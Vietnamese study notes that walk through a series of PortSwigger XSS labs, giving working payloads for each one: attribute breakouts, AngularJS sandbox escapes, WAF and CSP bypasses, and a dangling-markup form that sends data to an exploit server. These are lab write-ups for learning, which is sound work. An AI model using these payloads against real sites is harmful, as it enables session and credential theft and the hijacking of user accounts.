-[TOC]
# lý thuyêt:
- phân loại : 
    +  Reflected XSS: the server includes attacker-controlled input in the HTTP response HTML (or headers) without proper encoding/escaping; the malicious script is executed when the browser parses that response. The attack typically requires the victim to click a crafted link or submit a form that causes the server to reflect the payload back.
    +  DOM XSS: the server response does not itself contain the executable payload; instead client-side JavaScript reads attacker-controlled data from the DOM (URL fragment, query string, cookies, localStorage, postMessage, etc.) and inserts it into the page DOM insecurely (innerHTML, document.write, eval, location, etc.), causing script execution purely via client-side code modification.
    + store XSS: 
## Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

Lab description :This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.
To solve this lab, make the "back" link alert document.cookie.

Start :+1: 
 - truy cập  "/feedback" 
     ![image](https://hackmd.io/_uploads/rkn7KY-Bgx.png)
     
     
    - nhập submit các field của form như bình thường  , sau đó (Ctrl+U) để xem code , dựa trên mô tả nhận thấy một đoạn script :
     ![image](https://hackmd.io/_uploads/Sy8koKWBee.png)

     
     - Nhận thấy 'returnPath' không có một cơ chế validate input nào , với 'returnPath' nhận từ URL  , rồi sau đó gán herf của thẻ  \<a> 
     - Có thể chèn cript vào attribute herf để thực thi : payload : javascript:alert(document.cookie) , lệnh alert() được thực thi  khi click vào back
     - thẻ \<a> sẽ trở thành ![image](https://hackmd.io/_uploads/HkGknFbHxl.png)
#Lab: Reflected XSS into attribute with angle brackets HTML-encoded
Lab description: This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.

hint : Just because you're able to trigger the alert() yourself doesn't mean that this will work on the victim. You may need to try injecting your proof-of-concept payload with a variety of different attributes before you find one that successfully executes in the victim's browser.

start:

- Theo như mô tả thì vulnerability XSS ở chức năng Search , thực hiện tìm kiếm kí tư <script>alert("quan dep zai")</script>' sau đó (Ctrl + U) để xem code ta thấy :![image](https://hackmd.io/_uploads/SJP6y5bBxg.png)
- các kí tự < , > đã bị encode nhưng kí tự "  ,  ' lại không bị encode , sử dụng kí tự "  để đóng attribute value của input tag , sau đó dùng even attribute để thực thi đoạn mã script trong thẻ input tag 
- payload : a" "onfocus"=(alert('quan dep zai')) . 
- chúng ta  click vào ô tìm kiếm thì mã script được thực thi và đoạn code chúng ta nhận được : ![image](https://hackmd.io/_uploads/S1VIWqbrxg.png)




 ## Lab: Reflected XSS into attribute with angle brackets HTML-encoded
Lab description: This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.

hint : Just because you're able to trigger the alert() yourself doesn't mean that this will work on the victim. You may need to try injecting your proof-of-concept payload with a variety of different attributes before you find one that successfully executes in the victim's browser.

start:

- Theo như mô tả thì vulnerability XSS ở chức năng Search , thực hiện tìm kiếm kí tư <script>alert("quan dep zai")</script>' sau đó (Ctrl + U) để xem code ta thấy :![image](https://hackmd.io/_uploads/SJP6y5bBxg.png)
- các kí tự < , > đã bị encode nhưng kí tự "  ,  ' lại không bị encode , sử dụng kí tự "  để đóng attribute value của input tag , sau đó dùng even attribute để thực thi đoạn mã script trong thẻ input tag 
- payload : a" "onfocus"=(alert('quan dep zai')) . 
- chúng ta  click vào ô tìm kiếm thì mã script được thực thi và đoạn code chúng ta nhận được : ![image](https://hackmd.io/_uploads/S1VIWqbrxg.png)

## Lab : Stored XSS into anchor href attribute with double quotes HTML-encoded
Lab description : This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.

 start :+1: 
- theo nhưn mô tả đề bài thì lab này có vulnrability ở function comment , chúng ta có một form bình luận :![image](https://hackmd.io/_uploads/SyWXxbMHxl.png) 

sau khi chèn một số paylaod sau đó Ctrl+U thì thấy một đoạn code  như sau :![image](https://hackmd.io/_uploads/Syknb-frlg.png)
và các kí tự " , > , < bị encode
attribute herf của được lấy từ website mà user cung cấp . Dùng burp chèn payload : javascript:alert(1) vào field này , nhận thấy phía server không có cơ chế kiểm tra website có tính hợp lệ hay không . Sau khi chèn payload vào click vào link trên comment thì lệnh alert() được thực thi . Code sau khi chèn payload : 
![image](https://hackmd.io/_uploads/Hke7m-zrlg.png)



## Lab  : Reflected XSS into a JavaScript string with angle brackets HTML encoded
Lab description: This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

Start:
- theo như mô tả thì lab này có vulnrability ở function search . Thực hiện chèn vào một số payload vào nhận thấy các kí tự " , > , < bị encode còn kí tự ' lại không bị encode . Nhận thấy đoạn code sau : ![image](https://hackmd.io/_uploads/ByjaVWGSeg.png)
- có thể sử dụng kí tự ' để kết thúc biến searchTerms sau đó chèn alert() vào trong đoạn script này .
- payload : a' ; alert(1) ; var a='
- sau khi chèn pyaload thì nhận thấy bài lab đã thành công , đoạn code sau khi chèn payload : ![image](https://hackmd.io/_uploads/Hk7SSZzHgg.png)



## Lab: DOM XSS in document.write sink using source location.search inside a select element
Lab Description: This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.

 Start :+1: 
- Lab này có vulnrability ở function check stock , nhận thấy đoạn script sau : ![image](https://hackmd.io/_uploads/HJVQvZfSgg.png)

- sử dụng burp để bắt requets check stock ![image](https://hackmd.io/_uploads/rJFgdbzSlx.png)
 tham số "storeid" nhận từ user nhưng chưa có cơ chế validate 
- payload :&storeId=Milan"</select> <script>alert(1)</script>
- sau khi chèn payload thì đã thành công chèn mã script vào.  . Đoạn mã trên chạy sẽ có kết quả tương tự như sau :![image](https://hackmd.io/_uploads/ByaW_WMHgg.png) 

## Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

Lab description: : AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.

Start :+1: 
- như mô tả thì lab sử dụng framework AngularJs  (<body ng-app>) . thử nhập một AngularJs expression : {{2+2}} và kết quả nhận được ![image](https://hackmd.io/_uploads/H1nUcbGBel.png) website cho người dùng thực hiện AngularJs expression , vậy nếu thể sử dụng để chèn alert() vào đây
- payload : {{$on.constructor('alert(1)')()}} và nó đã được thực thi 
    
## Lab: Reflected DOM XSS
Lab description: This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink. To solve this lab, create an injection that calls the ‘alert()’ function.

Start: 
- ![image](https://hackmd.io/_uploads/ryA9xGzHle.png)
xem  nội dung của fie.js : ![image](https://hackmd.io/_uploads/Sk1RxzfSxe.png)
đoạn code js sử dụng eval() , việc sử dụng eval() để hiển thị respond từ server đến client có khả năng xảy ra lỗi bảo mật vì eval() nhận vào một chuỗi và thực thi chuỗi đó như javascript , dùng burp thì nhận thấy respond trả về dạng Json , ![image](https://hackmd.io/_uploads/HkD5GGfHgx.png)
tham số searchTerm do user nhập vào , có thể điều chỉnh 
- payload 1 : quandz" ; alert(1) "![image](https://hackmd.io/_uploads/H1JZEMfSel.png)
không được thực thi do server đã encap kí tự " 
- payload 2 : \"};alert(1)// dùng // để comment phần làm sai cú pháp ![image](https://hackmd.io/_uploads/r18RVMMrlg.png)
và alert() đã được thực thi

## Lab: Stored DOM XSS
Lab description: This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the ‘alert()’ function.

Start: 
- tương tự như lab trước ta có file .js ![image](https://hackmd.io/_uploads/HJW3BffSxg.png)
ở function enscapeHTML() sử dụng replace chỉ thay thế kí tự đầu tiên mà match , thay vào đó nên dùng repalceall hoặc dùng replace kết hợp với  RegExp

- payload : <><img src="a" alt="err" , onerror="alert(1)"> sư dụng even attribute để alert() xảy ra


## Lab: Reflected XSS into HTML context with most tags and attributes blocked

Lab description: This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors. To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the ‘print()’ function.

Start: 
- chèn vào payload 1 : ![image](https://hackmd.io/_uploads/r1IWDPzrex.png) vào thanh search nhận được thông báo : ""Tag is not allowed"" . Server chặn các tag html , sử dụng burp intruder để check thì thấy có hai tag không bị chặn : <body> và  <custom tag> 
-paydload 2 : <body onload="alert('quan dz')"></body> nhận  thông báo "Attribute is not allowed" , tương tự như trên thì có attribute onresize không bị block
- payload 3 : <body onresize="alert(1)"></body> khi thay đổi kích thuộc page thì alert() thực thi . Bây giờ cần đưa payload này đến nạn nhận 
- truy cập ![image](https://hackmd.io/_uploads/By7QcPfSlx.png)dùng iframe để nhúng một html khác vào html bị lỗi XSS thay đổi phần body thành <iframe src="https://0a3f0087031a141880596701006700c9.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'></iframe> sau đó gửi cho victim và thành công

## Lab: Reflected XSS into HTML context with all tags blocked except custom ones

Lab description:This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie

Start :+1:
- tương tự như lab trên thì lab này cũng chặn các tag html trừ custom tag 
- payload 1 : <img2 sr payload này sẽ được lưu vào DOMc="a" tabindex="1" onfocus="alert(document.cookie)" id="3"> payload này sẽ được lưu vào DOM , alert() được thực thi khi trên URL :"https://0a13006703adfa0f80b803ba00fb0030.web-security-academy.net/?search=%3Cimg2+src%3D%22a%22+tabindex%3D%221%22+onfocus%3D%22alert%28document.cookie%29%22+id%3D%223%22%3E#3"   có kí tự "#3" , bây giờ cần phải đểb victim truy cập vào url này , dùng "go to exploit server"
- payload 3 : <script>
location = 'https://0a13006703adfa0f80b803ba00fb0030.web-security-academy.net/?search=%3Cimg2+src%3D%22a%22+tabindex%3D%221%22+onfocus%3D%22alert%28document.cookie%29%22+id%3D%223%22%3E#3';
</script>
    
## Lab: Reflected XSS with some SVG markup allowed

Lab description: This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events. To solve the lab, perform a cross-site scripting attack that calls the ‘alert()’ function.

Start:
- làm tương tự như hai lab trên , ta thấy lab này không chặn animatetransform với attribute onbegin

- payload : <svg ><animateTransform onbegin="alert(1)" /></svg>

## Lab: Reflected XSS in canonical link tag

Lab Description:
This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:

ALT+SHIFT+X
CTRL+ALT+X
Alt+X
    
- Start :+1: 
- theo như gợi ý của đề bài : canonical link tag , xem xét đoạn code sau : ![image](https://hackmd.io/_uploads/ry_CY_MBgg.png) , herf là link của lab , nếu thực hiện một vài query trên url ta thấy href giữ nguyên:![image](https://hackmd.io/_uploads/S1GN9OGHel.png)
- payload 1 : ?quan=a'/> <script>alert(1)</script>< và ![image](https://hackmd.io/_uploads/r1WMiOMBeg.png)
- payload 2 : payload : ?' accesskey='x' onclick='alert(1) vì đề bài đề cập đến phím tắt nên them accesskey ![image](https://hackmd.io/_uploads/Hy59nOfHxg.png)nhận thấy kêt quả trả về bị sai systax vì space bị encode 
-payload 3 : ?'accesskey='x'onclick='alert(1)
                                                      
- nhận xét :  mặc dù accesskey , onclick k hoạt động trong <link> nhưng theo cơ chế sửa lỗi của trình duyệt thì sẽ đóng sớm thẻ <link>
    

## Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

Lab Description:
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the ‘alert’ function.
    
-Start :+1: 
- payload 1 : <script>alert(1)</script> ta có kết quả sau : ![image](https://hackmd.io/_uploads/HJpzk5GSeg.png)nhận thấy trên \<h1> các kí tự > , < , " , '  đều đã bị encode nhưng trong đoạn script , biến searchTerms được lấy từ input người dùng nhưng không encode hay encape các kí tự nguy hiểm lưu ý là chỉ encape kí tự '
- payload 2 : ;</script> <script>alert("quân đep zai")</script> đóng sớm thẻ script và chèn một cặp thẻ mới vào 

## Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
    
Lab Description:
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double quotes are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
    
Start :
    payload 1 : <script>alert('1')</script> nhận được kết quả ![image](https://hackmd.io/_uploads/r1YLR2fBll.png)ta thấy các kí tự > , < , "  đều bị 
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     còn kí tự '  bị encape . 
    payload 2 : ahihi';alert(1) nhận kết quả ![image](https://hackmd.io/_uploads/SyBokTzBxe.png), kí tự ' bị encape , chỉ cần hai kí tự '; vị vô hiệu hóa thì đoạn code đúng cú pháp
    payload 3 : ahihi\';alert(1);// kết quả ![image](https://hackmd.io/_uploads/rJl_WZ6MSxg.png)

    
## Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

Lab Description:
This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the ‘alert’ function when the comment author name is clicked.

-Start :+1: 
    - ![image](https://hackmd.io/_uploads/BJWyO6MHee.png) , sau đó ta nhận thấy các kí tự / , ' bị encape và các kí tự > , < , " bị encode .
    -hiểu cách mà trình duyệt parse và xử lý JavaScript context trong các attribute của HTML như sau :
    + parse HTML và decode các HTML : các HTML entities (bao gồm unicode )ĐƯỢC decode tự động
    + sau đó JavaScript parse : javascript sẽ xử lý chuỗi như bình thường 

trình duyệt parse và sử lý JavaScript trong cặp thẻ <script></script> :
    + trình duyệt phân tích cú pháp HTML và xác định các thẻ <script></script> , nội dung trong cặp thẻ này coi là "raw text" 
        . các HTML entities KHÔNG được tự động decode
        . các unicode vẫn được decode tự động 
    + trình duyệt parse xử lý javascript như bình thường 
    Theo như các kiến thức được tổng quát trên thì chúng ta có payload như sau :+1: 
    payload : https:');alert(1)// và encode payload này thành :https:&#39;&#41;&#59;alert(1)// 
    
## Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
    
Lab Description:
This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and back-ticks escaped. To solve this lab, perform a cross-site scripting attack that calls the ‘alert’ function inside the template string.
    
-Start :+1: 
    - ![image](https://hackmd.io/_uploads/Hkcz8RGrxx.png)
ở dòng code thứ 2 ta thấy message được lưu trong một template literal là cái được lưu ở trong hai đâu ``
     Đặc điểm của template literal:

    
Lab Description:${alert(1)} 
    
    
## Lab: Exploiting cross-site scripting to steal cookies
    
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim’s session cookie, then use this cookie to impersonate the victim.

-Start :+1: 
    - Tìm nới bị vulnrability XSS , sau khi chèn một vài payload vào các feild thì thấy comment feild bị vulnrability XSS 
    - ![image](https://hackmd.io/_uploads/H1PF9Rfrll.png)
khi chèn payload này vào thấy server của burp nhận request bao gồm cookies 
    - dùng exploit server để victim truy cập vào trang này để đọc comment thì cookies sẽ được gửi về 

    
## Lab: Exploiting cross-site scripting to capture passwords

Lab Description:
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim’s username and password then use these credentials to log in to the victim’s account
    
-Start :+1: 
    
- làm tương tự như lab trên nhưng không thấy cookies của victim trả về và length của body là 0 . Khả năng cao Server sử dụng **HttpOnly** 
- Lợi dụng chức năng auto fill, tạo hai ô input giả mạo ứng với username và password bằng cách post comment với nội dung: 
    ![image](https://hackmd.io/_uploads/BJVVe1Xrxg.png)
- trên server burp nhập request ![image](https://hackmd.io/_uploads/S1FnlJmSge.png)
- dùng credentials này để login
    
    
    
## Lab: Exploiting XSS to bypass CSRF defenses
 
Lab Description:
This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: wiener:peter

 Hint
You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, use a different email address for the final exploit you deliver to the victim.
    
-Start:   
- Sử dụng credentials: wiener:peter để login và thay đổi email. ![image](https://hackmd.io/_uploads/BkMLGkXSgl.png)
để đổi email cần csrf token "**Dcjp7aeKPQ0XdobajXp10DrYTQ1jWCBz**" với request change như như sau  : ![image](https://hackmd.io/_uploads/BJgiGyXrxl.png)
 đầu tiên cần tạo một request đên "**/my-account**" sau đó thực một request post đến "**/my-account/change-email**"

-payload : ![image](https://hackmd.io/_uploads/SJemm1XBgx.png)
đnagư đoạn script này vào comment field thì email được thay đổi 
    
## Lab: Reflected XSS with event handlers and href attributes blocked
    
Lab Description:
This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.

To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:

\<a href="">Click me</a>

    
-Start: 
 
- payload 1 : payload 1 : \<img src="a" onerror="alert(1)"> nhập thông báo "Tag is not allowed" . Dùng intruder check xem server không chặn những tag html nào : Nhận thấy không chặn <a> , <animate>  
- payload 2 : ![image](https://hackmd.io/_uploads/rJ2BH1mSxg.png)
không thấy "click " xuấ hiện , để hiện text trong thẻ \<SVG> cần dùng thẻ \<text>  , tận dụng \<animate> để xét attribute cho tag cha của nó 
- payload 3 : ![image](https://hackmd.io/_uploads/BJ3kUJQSex.png)
và đã thành công
    

    
## Lab: Reflected XSS with AngularJS sandbox escape without strings
    
-Lab description : ![image](https://hackmd.io/_uploads/rJlJq8N1vlg.png)
- Start :+1: 
    -![image](https://hackmd.io/_uploads/rkUgOilvlg.png)

    - ![image](https://hackmd.io/_uploads/SJ7y_sgDll.png)
    - đoạn script có sử dụng angularjs framework . Blog hiển thị trực tiếp kết quả của $scope.value lên trình duyệt .
    - $parse(expression) sẽ biến chuỗi expression thành một function cái được sử dụng để parse và evaluate cái expression được truyền vào . (không trực tiếp thực thi )
    - kiểm tra thì thấy lab sử dụng **Angularjs 1.4.4** ![image](https://hackmd.io/_uploads/HJemZFpuxe.png) . Tìm payload để bypass ở [link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) thì có paylaod : **{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}** . Sử dungh payload này thì thấy ' bị encode html và eval() bị cấm ở lab này (mô tả)
    - mục đích của payload này là từ 'a'.constructor trả về String (hàm tạo chuỗi) sau đó dùng prototype để ghi đè charaAt để phá vớ logic của hàm sanitize . nhưng lab này không cho dùng eval() nên chúng ta sử dụng order by trong angularjs để thực thi expression 
    - payload 2 : **toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1;**
    và đã thành công . bên sau orderBy cần một string expression  sử dụng String.fromcharCode() để tạo string. toString().constructor để tạo ra một hàm tạo String
    
    
## Lab: Reflected XSS in a JavaScript URL with some characters blocked
    
![image](https://hackmd.io/_uploads/SJ24QuZtex.png)
    
- start:
    - test comment function : ![image](https://hackmd.io/_uploads/BJN_Qd-tgg.png)
    nhận thấy không thoát được attribute của a tag:
    ![image](https://hackmd.io/_uploads/SJNCXdWYex.png)
    - phần body của của lệnh fetch() lấy từ URL - dangerous input .  Nếu chúng ta chèn vào một payload để chèn  agurment thứ 2 của fetch() thì xss có thể thực thi:
    ![image](https://hackmd.io/_uploads/S1oLB_-Ygl.png)
    - payload 1 : **',x:alert(1234),y:'** để thành `<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=4',x:alert(1234),y:''}).finally(_ => window.location = '/')">Back to Blog</a>`
    nhận lỗi **Invalid blog post ID**
    - payload 2 : **&a=1();"><%27** thấy vẫn thỏa mãn và DOM element vẫn lấy giá trị này vào phần body của fetch() nhưng kí tự **()** bị remove bởi filter
    - cần chèn vào để trở thành đoạn code như sau : `
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=4&'},a = b =>{onerror=alert;throw 1337},toString=a, window+'', {z:''}).finally(_ => window.location = '/')">Back to Blog</a>` khi click vào link thì alert() sẽ thực thi
    payload : **`&'},a%3db%3d>{onerror%3dalert;throw/**/1337},toString%3da, window+'', {z:'`**
    - mục đích tạo một trigger không dùng () để tạo xss . ý tưởng tận dụng cơ chế tự gọi toString() của javascript arrow function được gọi , overwrite toString <là properties mặc định của windon object> kí tự comment trong js thay cho khoảng trắng vì lab sẽ tự động thêm kí tự + để thay khoảng trắng (phá syntax của throw)
    - fix : Remove hoặc escape tất cả ký tự đặc biệt trong JavaScript context: ', ", \, {, }, ;, ,, /, *, =, >, <.  Không sửu dụng các sink nguy hiểm như javascipt: trong a tag thay vào đó sử dụng event listener

                                                                                                                   
## Lab: Reflected XSS protected by very strict CSP, with dangling markup attack
![image](https://hackmd.io/_uploads/BJ5dBgGKee.png)
- start:
    - login với credentials: wiener:peter . Bắt request change email : ![image](https://hackmd.io/_uploads/rkT4veftll.png)request có cơ chế chống csrf và thiết lập CSP:**Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';** . 
     - khi chèn một email vào url thì ta nhận thấy giá trị này được reefflect trong DOM . ![image](https://hackmd.io/_uploads/BylwvQfKel.png)
     - nhận thấy lab này không encode hay remove kí tự nào .  Các CSP này chỉ check xem nguyền tài lên phải là **self** nhưng không có các CSP như  **form-action 'self'** , hay không check **target attribute** của **base tag** .
     - payload : **https://0a9400eb034db3b5800a037200d8008a.web-security-academy.net/my-account?id=wiener&email=abc.com%22%3E%20%3C/form%3E%20%3Cform%20action=%22https://exploit-0a9a000f03d9b3dd80e20268018700b5.exploit-server.net%22%20method=%22get%22%3E**  Khi click vào update email thì sẻ tải trang exploit server . Check ở phần log thấy đi kèm tham số scrf: ![image](https://hackmd.io/_uploads/Bk6I0mGKle.png)
     - nhưng khi dùng payload :![image](https://hackmd.io/_uploads/BkERGVzKge.png)thì lại không thấy scrf token của victim trong log . Làm theo hướng khác :)))
     
                                                                                                                   
                                                                                                                   
                                                                                                                   
##   Lab: Reflected XSS protected by CSP, with CSP bypass   
 ![image](https://hackmd.io/_uploads/rkKBG3zFgg.png)
- Start:
    - ở search function thực hiện chèn payload : **`<img src=1 onerror=alert(1)>`**  nhận thấy trong DOM không bị lọc hay encode gì nhưng payload alert() không được thực thi trong khi nguồn ảnh vẫn được load bởi lab . ![image](https://hackmd.io/_uploads/BkeYX2MYee.png)![image](https://hackmd.io/_uploads/BJ1JV3ztgg.png).
    - lab này đã được config CSP : **Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=   cấm sử dụng inline javascript
    - thông thường CSP đã được config thì không thể overwrite nhưng nếu trong chome thì **đã thêm directive script-src-elem (áp dụng riêng cho <script> element, nhưng không áp dụng cho event handler như onclick), và cái này ghi đè script-src**
    - nhận thấy trong CSP : **report-uri /csp-report?token=**  đây là directive gửi lên server , nếu directive này lấy input user làm tham số token thì có thể bị inject
    - payload : **`https://0aff00ac04c27dc983ba8c3800dc0063.web-security-academy.net/?search=%3Cimg+src%3D1+onerror%3Dalert%281%29%3E&token=;script-src-elem%20%27unsafe-inline%27`**
                                                       


                                                                                                             
                                                                                                                   
                                                                                                              

                                                                                                                   
                                                                                                                  
                                                                                                             
                                                                                                     
                                                                                                                   
                                                                                            
                                                 
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                
                                                                                                                   
                                                                

    

    
    

